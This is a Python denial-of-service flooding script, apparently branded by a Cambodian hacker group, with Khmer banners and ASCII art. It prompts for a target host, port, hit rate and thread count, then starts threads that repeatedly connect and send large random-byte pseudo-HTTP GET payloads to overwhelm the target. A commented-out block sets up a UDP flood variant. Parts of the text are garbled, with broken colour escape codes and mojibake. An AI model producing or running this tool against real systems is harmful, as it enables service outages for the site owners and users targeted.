
"""import socket, threading, os, sys, random, ctypes, time

delay=200000000000000
psc=50000000000000000
ux=2000000
port = 1000000
sent = 00000000
id=100000·û™·û™
svc=[]



sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
if os.name=='nt':
    os.system('color b')
    os.system('title ·∫∏ras v7')
    ctypes.windll.kernel32.SetConsoleTitleW('·∫∏ras v7')
else:
    os.system('setterm -background white -foreground white -store')

def cls():
    os.system('cls' if os.name=='nt' else 'clear')
cls()

def type(text):
  words = text
  for char in words:
    time.sleep(0.08)
    sys.stdout.write(char)
    sys.stdout.flush()
    
/*
 * 
 * 
 *Free code 
print("·ûñ·üí·ûö·üá·ûô·ûæ·ûÑ·ûÇ·û∫·ûá·û∂·ûò·û∂·ûè·û∂·ûî·û∑·ûè·û∂")
print(" ·ûô·ûæ·ûÑ·ûá·û∂·ûò·ûì·ûª·ûü·üí·ûü·ûô·ûæ·ûÑ·ûè·üí·ûö·ûº·ûú·ûä·ûπ·ûÑ·û¢·üÜ·ûñ·û∏·ûü·üÅ·ûÖ·ûÄ**·û∏·ûõ·üí·û¢·üî")
input("·ûü·ûº·ûò·ûö·ûÑ·ûÖ·û∂·üÜ......·ûÖ·ûª·ûÖ·ûú·û∂·ûä·ûæ·ûò·üí·ûî·û∏·ûä·üÜ·ûé·ûæ·ûö·ûÄ·û∂·ûö")
print("üë©‚Äçüíªüåèü™êhackers Cambodiaüåπ")
print("·ûÅ·üí·ûâ·ûª·üÜ·ûá·û∂·ûÄ·ûº·ûì·ûõ·üí·û¢·ûü·ûò·üí·ûö·û∂·ûî·üã·ûò·û∂·ûè·û∂·ûî·û∑·ûè·û∂")
type("‚îÇ‚îÇ {====>ddos [·ûÄ·üí·ûö·ûª·ûò·ûô·ûæ·ûÑ·ûò·û∂·ûì·ûò·üâ·û∂·ûá·û∑·ûè·ü£·û¢·üí·ûì·ûÄ] |: target ip")
print()
ip = input("‚îÇ‚îÇ :")
ipp=ip
target=ip
  * 
  * 
 *  
 
"""

import socket
import time
import os
import random

from threading import Thread

os.system("clear")

if not __name__ == "__main__":
    exit()
      
class ConsoleColors:
    HEADER = '\066[10m'
    OKBLUE = '\066[10mm'
    OKGREEN = '\066[10m'
    WARNING = '\066[10m'
    FAIL = '\066[m'
    BOLD = '\066[1m'
    
print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
            
            
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ø‚†ü‚†õ‚†õ‚†â‚£â‚£â‚£â‚£â‚£â‚£â‚£â‚°©‚†ô‚†õ‚†ª‚†ø‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚£ø‚°ø‚†ü‚¢ã‚£°‚£§‚£∂‚£∂‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∂‚£∂‚£§‚£Ñ‚£â‚†õ‚†ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ø‚†ã‚£°‚£¥‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∂‚£Ñ‚°â‚†ª‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†ü‚£Å‚£¥‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£Ñ‚†ô‚†ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ã‚£†‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø Cambodia‚Äã ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ü‚¢°‚£æ‚£ø‚£ø‚£ø‚£ø‚°ø‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£Ü‚†ô‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚°ø‚†É‚£¥‚£ø‚£ø‚£ø‚°ø‚†õ‚†Å‚£†‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£¶‚†à‚†ô‚†ø‚£ø‚£ø‚£ø‚£∑‚°Ä‚†ª‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚°ø‚¢Å‚£æ‚£ø‚†ü‚¢Å‚°æ‚†Å‚¢Ä‚¢¥‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†ø‚†ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚°Ä‚°Ä‚†π‚£Ü‚†ô‚£ø‚£ø‚°Ñ‚†π‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚°ø‚¢Å‚£æ‚°ø‚°è‚†Ä‚£º‚£Å‚°¥‚¢´‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£è‚†Ä‚£ø‚°Ü‚†Ä‚£ª‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°è‚¢≥‚£Ñ‚£π‚°Ä‚†ò‚°ø‚£ø  ‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚†Å‚£æ‚°ü‚¢π‚°á‚¢†‚†ü‚†â‚£†‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ü‚£°‚£¥‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£¶‚°à‚†ô‚¢á‚†Ä‚£ø‚†π‚£ø‚°Ä‚¢ª‚£ø‚£ø
‚£ø‚°á‚¢∏‚£ø‚†Ç‚¢∏‚°á‚†Ä‚£†‚°û‚£ª‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†∂‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°õ‚£¶‚°Ä‚†Ä‚£ø‚†Ä‚¢ø‚£ß‚†Ä‚£ø‚£ø
‚¢ø‚†Ä‚£æ‚£ø‚†Ä‚¢∏‚£ß‚†û‚†Å‚£∞‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£Ä‚£†‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°à‚†ô‚¢¶‚£ø‚†Ä‚¢∏‚£ø‚°Ñ‚¢∏‚£ø
‚°á‚¢†‚£ø‚¢ª‚°Ñ‚†ò‚†Å‚¢Ä‚°¥‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£Ñ‚†Ä‚†ã‚†Ä‚£∂‚¢ª‚°á‚†Ä‚£ø
‚°Å‚¢∏‚°è‚†ò‚£á‚†Ä‚¢∞‚°ü‚¢±‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†ü‚£ø‚£¨‚°â‚£â‚£ø‚°ø‚†ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†π‚£¶‚†Ä‚¢†‚°è‚¢ò‚£ø‚†Ä‚£ø
‚†á‚¢∏‚£è‚†Ä‚¢π‚£Ü‚†ü‚†Ä‚£∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ø‚†ü‚†õ‚†õ‚†â‚†Ä‚¢∞‚£ø‚£ü‚°Ö‚£ù‚£ø‚£ø‚†Ä‚†à‚†õ‚†ª‚†ø‚†ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†ò‚£á‚£æ‚†Å‚¢∏‚£ø‚†Ä‚£ø
‚†Ä‚¢∏‚£ø‚°Ñ‚†à‚£ø‚†Ä‚¢Ä‚£è‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∫‚£ø‚£ø‚°á‚¢ª‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ü‚†Ä‚¢π‚†è‚†Ä‚£æ‚£ø‚†Ä‚£ø
‚°á‚†ò‚£ø‚¢∑‚°Ä‚†à‚†Ä‚£º‚†è‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚†Ä‚†∏‚£ø‚°ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†á‚¢ø‚°Ä‚†ò‚†Ä‚£º‚¢ø‚°á‚†Ä‚£ø
‚£ø‚†Ä‚¢ø‚°à‚†ª‚£Ü‚†Ä‚£ø‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ª‚£ø‚†Ä‚†Ä‚£ø‚†É‚†Ä‚†Ä‚†Ä.  ‚†Ä‚†à‚¢ê‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚¢∏‚°á‚¢†‚°æ‚†ã‚£∏‚†É‚¢∏‚£ø‚£ø
‚£ø‚°á‚¢∏‚£ß‚†Ä‚†à‚¢∑‚°è‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ª‚†Ä‚†Ä‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°è‚†Ä‚¢ò‚£∑‚†ã‚†Ä‚£∞‚°ü‚†Ä‚£ø‚£ø
‚£ø‚£ø‚°Ä‚¢ª‚£ß‚°Ä‚†Ä‚†ô‚†Ä‚†ê‚£ß‚†π‚£ø‚£ø‚£ø‚£ø‚£ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚¢±‚°á‚†Ä‚†ú‚†Å‚¢Ä‚£∞‚£ø‚†Å‚£∏‚£ø‚£ø
‚£ø‚£ø‚£∑‚°à‚¢ø‚°ô‚†≥‚£§‚£Ä‚†Ä‚¢ø‚°Ä‚†π‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚°ø‚†Ä‚¢æ‚†É‚¢Ä‚£†‚†∂‚†ã‚£Ω‚†É‚£∞‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£∑‚°à‚¢∑‚£Ñ‚†Ä‚†â‚†õ‚¢æ‚£á‚†Ä‚†π‚£û‚¢ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚°ø‚†Å‚¢†‚£ø‚†û‚†ã‚†Å‚¢Ä‚£æ‚†ã‚£∞‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£∑‚°Ä‚†ª‚£∑‚°¶‚£Ä‚°Ä‚†à‚†É‚†Ä‚†ô‚£Ü‚†â‚†Ç‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚¢ª‚°û‚†Å‚†Ä‚†â‚†Ä‚£Ä‚°§‚£∂‚°ø‚†Å‚£∞‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£Ü‚†ò‚¢ø‚£å‚†ô‚†≥‚†∂‚†¶‚£§‚£º‚£∑‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚£Ø‚£§‚£¥‚†∂‚†∂‚†õ‚¢â‚£æ‚†è‚¢Ä‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£Ñ‚†ô‚¢ø‚£¶‚£§‚£Ä‚£Ä‚£Ä‚£Ä‚£†‚£§‚£§‚†Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚††‚£¶‚£†‚£§‚£Ä‚£Ä‚£Ä‚£Ä‚£†‚£§‚£æ‚†ü‚¢Å‚£¥‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£§‚°â‚†ª‚£¶‚£â‚†ô‚†õ‚†â‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†â‚†ô‚†õ‚¢â‚£©‚†æ‚†ã‚£†‚£∂‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£¶‚£Ñ‚†â‚†ª‚¢∂‚£∂‚£∂‚£∂‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£∂‚£∂‚£∂‚£∂‚†û‚†ã‚¢Å‚£§‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∂‚£§‚£à‚°ô‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ü‚†ã‚£â‚£†‚£¥‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∂‚£∂‚£§‚£§‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£†‚£§‚£¥‚£∂‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
                        üôè·ûÅ·üí·ûâ·ûª·üÜ‚Äã·ûü·üí·ûö·ûõ·û∂·ûâ·üã‚Äã·ûî·üí·ûö·ûë·üÅ·ûü‚Äã·ûÄ·ûò·üí·ûñ·ûª·ûá·û∂üôè
             ''')
    
def getport():
    try:
        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
        return p
    except ValueError:
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
        return 80

host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "·ûï·üí·ûë·üá‚Äã:\r\n")
port = getport()
speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))

ip = socket.gethostbyname(host)

bytesToSend = random._urandom(24599)

i = 0;



class Count:
    packetCounter = 0 

def goForDosThatThing():
    try:
        while True:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dosSocket.connect((ip, port))
                for i in range(speedPerRun):
                    try:
                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
                        Count.packetCounter = Count.packetCounter + 1
                    except socket.error:
                        print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
                    except KeyboardInterrupt:
                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            except socket.error:
                print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
            except KeyboardInterrupt:
                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            dosSocket.close()
    except KeyboardInterrupt:
        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
try:
        
    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
                                                          
        
‚£ø‚°ø‚†ã‚†â‚†Ä‚†Ä‚†à‚¢â‚°õ‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚¢õ‚°â‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†ª‚£ø‚£ø:
‚£ø‚°ü‚¢Ä‚£Ä‚£Ä‚£Ä‚°Ä‚†Ä‚†Ä‚†à‚†ô‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†ã‚†Å‚†Ä‚†Ä‚¢Ä‚£Ä‚£Ä‚£Ä‚£Ä‚†ô‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£¶‚£Ä‚†Ä‚¢Ä‚£π‚£ø‚£ø‚£ø‚£ø‚£è‚†Ä‚†Ä‚£Ä‚£¥‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚†ø‚†õ‚¢õ‚£ª‚°õ‚†ø‚¢∑‚°Ä‚¢ª‚£ø‚£ø‚£ø‚£ø‚°ü‚¢†‚°æ‚†ü‚¢õ‚£ü‚£õ‚°õ‚†ø‚£ø‚£ø‚£ø‚£ø
‚£Ø‚°ª‚†ø‚†É‚°Ä‚†Å‚†Ä‚†Ä‚†Ä‚†à‚†Ä‚†π‚£æ‚¢π‚£ø‚£ø‚°è‚£∑‚°á‚†Ä‚†Å‚†Ä‚†Ä‚†Ä‚†à‚¢ë‚†ò‚†ø‚¢ü‚£ø
‚£è‚£§‚£∂‚£¶‚£§‚£â‚£â‚£∞‚£à‚£§‚£¥‚£æ‚°ü‚¢∏‚£ø‚£ø‚°á‚¢ª‚£∑‚£§‚£§‚£Ä‚£Ü‚£Ä‚£â‚£•‚£¥‚£∂‚£§‚£π
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†Å‚¢∏‚£ø‚£ø‚°á‚†à‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ü‚£°‚°Ñ‚£∏‚£ø‚£ø‚£ß‚¢†‚£å‚¢ª‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£è‚†ª‚¢ø‚£ø‚£ø‚†ø‚†ü‚¢õ‚£°‚£ü‚£æ‚£ø‚°á‚£ø‚£ø‚£ø‚£ø‚¢∏‚£ø‚£ß‚£ª‚£å‚°õ‚†ø‚†ø‚£ø‚£ø‚†ø‚†ü‚£ø
‚£ø‚°Ñ‚†∞‚°Ñ‚†ê‚¢∂‚£ø‚£ø‚£ø‚£ø‚£ø‚£≠‚°±‚†¨‚£â‚£â‚†°‚¢é‚£≠‚£ø‚£ø‚£ø‚£ø‚£ø‚°∂‚†Ç‚¢†‚†Ü‚¢†‚£ø
‚£ø‚£ø‚°Ñ‚†π‚£Ü‚†Ä‚†π‚†ø‚†ø‚†ø‚†ø‚†ã‚†Ä‚†Ä‚£†‚£Ñ‚†Ä‚†Ä‚†ô‚†ø‚†ø‚†ø‚†ø‚†è‚†Ä‚£†‚†è‚¢†‚£ø‚£ø
‚£ø‚£ø‚£ø‚£Ñ‚†ò‚¢ß‚£Ñ‚£Ä‚£Ä‚£Ä‚£Ä‚†Ä‚†Ä‚†º‚†ø‚†ø‚†¶‚†Ä‚†Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£†‚°º‚†ã‚£†‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£¶‚†ë‚£Ø‚£õ‚£ø‚£ø‚£ø‚£∑‚£∂‚£∂‚£∂‚£∂‚£∂‚£∂‚£æ‚£ø‚£ø‚£ø‚£õ‚£µ‚¢ä‚£¥‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£å‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ç‚†â‚†â‚£©‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚££‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†Ä‚†Ä‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°á‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ß‚†Ä‚†Ä‚£º‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ä‚¢Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
              ·ûú·û∂·ûô·ûî·üí·ûö·û†·û∂·ûö‚Äã
   ''')
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====    üá∞üá≠           ] 25%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========     üá∞üá≠     ] 50%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [=============== üá∞üá≠     ] 75%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")
    
    for i in range(threads):
        try:
            t = Thread(target=goForDosThatThing)
            t.start()
        except KeyboardInterrupt:
            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
except KeyboardInterrupt:
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
    